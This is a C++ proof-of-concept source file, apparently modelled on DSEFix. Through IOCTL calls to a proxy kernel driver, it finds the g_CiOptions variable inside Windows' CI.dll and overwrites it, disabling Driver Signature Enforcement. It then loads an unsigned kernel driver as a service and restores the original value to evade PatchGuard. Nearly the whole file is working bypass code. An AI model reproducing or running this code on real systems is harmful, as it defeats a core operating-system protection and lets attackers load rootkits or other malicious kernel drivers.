// Refrense: https://github.com/hfiref0x/DSEFix
//

#include <iostream>
#include <Windows.h>

#include "../APICallProxy/IOCTLCodes.h"
#include "../APICallProxy/CommonStruct.h"
#include "hde64.h"

typedef struct _RTL_PROCESS_MODULE_INFORMATION
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES
{
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;


#define SystemModuleInformation 11
ULONG_PTR  CIModuleBase = 0;
CHAR szModuleName[] = "CI.dll";


LONG QueryCiOptions(_In_ PVOID MappedBase, _Inout_ ULONG_PTR* KernelBase);
ULONG_PTR QueryVariableAddress(VOID);
BOOL LoadDriver(LPCWSTR ServiceName, LPCWSTR DriverPath, DWORD StartType, BOOL DeletePrevioseVersion);


int main(int argc, WCHAR* argv[])
{

	BOOL Status = 1;
	DWORD returned;
	PRTL_PROCESS_MODULES ModuleInfo;
	QuerySystemInformationInfo SystemInformationptr{ 0 };
	AllocateVirtualMeomryInfo Allocate{ 0 };
	ReadWriteVirtualMemoryInfo WriteInfo{ 0 };
	ReadWriteVirtualMemoryInfo ReadInfo{ 0 };

	BYTE DisableValue_g_CiAddress[2] = { 0x00 ,0x00};
	BYTE OriginalValue_g_CiAddress[2] = { 0x00 ,0x00};
	ULONG_PTR   g_CiAddress = 0;


	HANDLE hDevice = CreateFile(L"\\\\.\\APICallProxy", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Failed To Open Driver Error Code: 0x%x\n", GetLastError());
		return 0;
	}


	//Get the size of structure
	SystemInformationptr.Data = NULL;
	SystemInformationptr.DataSize = 0;
	SystemInformationptr.InformationClass = SystemModuleInformation;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_QUERY_SYSTEM_INFORMATION, &SystemInformationptr, sizeof(QuerySystemInformationInfo), NULL, NULL, &returned, nullptr);

	//allocate memory for module info
	Allocate.BaseAddress = NULL;
	Allocate.RegionSize = SystemInformationptr.DataSize;
	Allocate.ProcessHandle = GetCurrentProcess();
	Allocate.Protect = PAGE_EXECUTE_READWRITE;
	Allocate.AllocationType = MEM_RESERVE | MEM_COMMIT;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_ALLOCATE_MEMORY_IN_PROCESS_USING_HANDLE, &Allocate, sizeof(AllocateVirtualMeomryInfo), NULL, NULL, &returned, nullptr);
	if (!Status) {
		printf("[-] Failed to Allocate Memory in Current Process Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Allocated Memory in Current Process at address: 0x%p\n", Allocate.BaseAddress);

	ModuleInfo = (PRTL_PROCESS_MODULES)Allocate.BaseAddress;

	//get loaded driver info
	SystemInformationptr.Data = ModuleInfo;
	SystemInformationptr.InformationClass = SystemModuleInformation;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_QUERY_SYSTEM_INFORMATION, &SystemInformationptr, sizeof(QuerySystemInformationInfo), NULL, NULL, &returned, nullptr);
	if (!Status) {
		//Free memory before exite
		printf("[-] Failed to Get Loaded Drivers Info Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	for (int i = 0; i < ModuleInfo->NumberOfModules; i++) {
		const char* p = strstr((const char*)ModuleInfo->Modules[i].FullPathName, szModuleName);

		if (p) {
			CIModuleBase = (ULONG_PTR)ModuleInfo->Modules[i].ImageBase;
			printf("[+] Found Base address of %s  at %p\n", ModuleInfo->Modules[i].FullPathName, ModuleInfo->Modules[i].ImageBase);
			break;
		}
	}

	if (!CIModuleBase) {
		printf("[-] Failed to Find Base address of CI.dll\n");
		return 0;
	}

	g_CiAddress = QueryVariableAddress();
	if (!g_CiAddress) {
		printf("[-] Failed to Find address of g_CiAddress Global Value\n");
		return 0;
	}

	printf("[+] g_CiAddress address is %p\n", g_CiAddress);


	ReadInfo.ProcessHandle = (HANDLE)GetCurrentProcess();
	ReadInfo.Data = OriginalValue_g_CiAddress;
	ReadInfo.BaseAddress = (PVOID)g_CiAddress;
	ReadInfo.DataLen = 1;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_READ_PROCESS_MEMORY, &ReadInfo, sizeof(ReadWriteVirtualMemoryInfo), nullptr, NULL, &returned, nullptr);
	if (!Status) {
		printf("[-] Faile to Read the Orginal Value of g_CiAddress Error code is: %x\n", Status);
		return 0;
	}

	printf("[+] The Orginal Value of g_CiAddress is: 0x%x\n", OriginalValue_g_CiAddress[0]);

	WriteInfo.ProcessHandle = GetCurrentProcess();
	WriteInfo.Data = DisableValue_g_CiAddress;
	WriteInfo.BaseAddress = (PVOID)g_CiAddress;
	WriteInfo.DataLen = 1;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WRITE_PROCESS_MEMORY, &WriteInfo, sizeof(ReadWriteVirtualMemoryInfo), nullptr, NULL, &returned, nullptr);
	if (!Status) {
		printf("[-] Failed to write Zero at g_CiAddress to Disable Driver signing policy Error CodeL 0x%x\n", Status);
		return 0;
	}

	printf("[+] Driver signing policy is Disabled\n");


	// load driver here
	if (!LoadDriver(TEXT("POCDriver"), TEXT("c:\\Users\\jony\\Desktop\\POC.sys"), SERVICE_DEMAND_START, TRUE)) {
		printf("[-] Failed to load unsigned Driver\n");
	}
	else {
		printf("[+] Unsigned Driver Loaded Successfully\n");
	}


	//change the value back to original because of PatchGuard
	WriteInfo.ProcessHandle = GetCurrentProcess();
	WriteInfo.Data = (unsigned char*)OriginalValue_g_CiAddress;
	WriteInfo.BaseAddress = (PVOID)g_CiAddress;
	WriteInfo.DataLen = 1;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WRITE_PROCESS_MEMORY, &WriteInfo, sizeof(ReadWriteVirtualMemoryInfo), nullptr, NULL, &returned, nullptr);
	if (!Status) {
		printf("[-] Failed to Change the g_CiAddress value to its original value, the PatchGuard might catch it depent on windows version and do BSOD \n");
	}
	else {
		printf("[+] Changed the g_CiAddress value to its original value\n");
	}

	return 0;
}

LONG QueryCiOptions(_In_ PVOID MappedBase, _Inout_ ULONG_PTR* KernelBase) {
	PBYTE        CiInitialize = NULL;
	ULONG        c, j = 0;
	LONG         rel = 0;
	hde64s hs;

	CiInitialize = (PBYTE)GetProcAddress((HMODULE)MappedBase, "CiInitialize");
	if (CiInitialize == NULL)
		return 0;


	c = 0;
	j = 0;
	do {

		/* call CipInitialize */
		if (CiInitialize[c] == 0xE8)
			j++;

		if (j > 1) {
			rel = *(PLONG)(CiInitialize + c + 1);
			break;
		}

		hde64_disasm(CiInitialize + c, &hs);
		if (hs.flags & F_ERROR)
			break;
		c += hs.len;

	} while (c < 256);


	CiInitialize = CiInitialize + c + 5 + rel;
	c = 0;
	do {

		if (*(PUSHORT)(CiInitialize + c) == 0x0d89) {
			rel = *(PLONG)(CiInitialize + c + 2);
			break;
		}
		hde64_disasm(CiInitialize + c, (hde64s*)(&hs));
		if (hs.flags & F_ERROR)
			break;
		c += hs.len;

	} while (c < 256);

	CiInitialize = CiInitialize + c + 6 + rel;

	*KernelBase = *KernelBase + CiInitialize - (PBYTE)MappedBase;

	return rel;
}

ULONG_PTR QueryVariableAddress(VOID) {
	LONG rel = 0;
	SIZE_T SizeOfImage = 0;
	ULONG_PTR Result = 0;

	WCHAR* wszErrorEvent, * wszSuccessEvent;
	PVOID MappedBase = NULL;

	CHAR szFullModuleName[MAX_PATH * 2];


	if (CIModuleBase == 0) {
		return 0;
	}

	szFullModuleName[0] = 0;
	if (!GetSystemDirectoryA(szFullModuleName, MAX_PATH))
		return 0;
	strcat(szFullModuleName, "\\");
	strcat(szFullModuleName, szModuleName);

	MappedBase = LoadLibraryExA(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (MappedBase) {

		rel = QueryCiOptions(
			MappedBase,
			&CIModuleBase);


		if (rel != 0) {
			Result = CIModuleBase;
		}
		FreeLibrary((HMODULE)MappedBase);

	}


	return Result;
}

//Did not implement registry operation yet in the APICallProxy Driver
BOOL LoadDriver(LPCWSTR ServiceName, LPCWSTR DriverPath, DWORD StartType, BOOL DeletePrevioseVersion) {
	SC_HANDLE scm;
	SC_HANDLE scService;
	BOOL result = FALSE;
	TCHAR FilePath[MAX_PATH];

	GetFullPathName(DriverPath, MAX_PATH, FilePath, NULL);
	scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!scm)	return FALSE;

	scService = CreateService(scm, ServiceName, ServiceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, StartType, SERVICE_ERROR_NORMAL, FilePath, NULL, NULL, NULL, NULL, NULL);
	if (!scService) {
		if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_SERVICE_EXISTS) {
			scService = OpenService(scm, ServiceName, SERVICE_ALL_ACCESS);
			if (!scService) goto Finish;
			if (DeletePrevioseVersion) {	// recreate
				if (!DeleteService(scService)) goto Finish;
				scService = CreateService(scm, ServiceName, ServiceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, StartType, SERVICE_ERROR_NORMAL, FilePath, NULL, NULL, NULL, NULL, NULL);
				if (!scService)	goto Finish;
			}
		}
		else goto Finish;
	}
	if (!StartService(scService, 0, NULL)) {
		if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) result = TRUE;
		else {
			result = FALSE;
			goto Finish;
		}
	}
	result = TRUE;

Finish:
	if (scm) CloseServiceHandle(scm);
	if (scService) CloseServiceHandle(scService);
	return result;
}
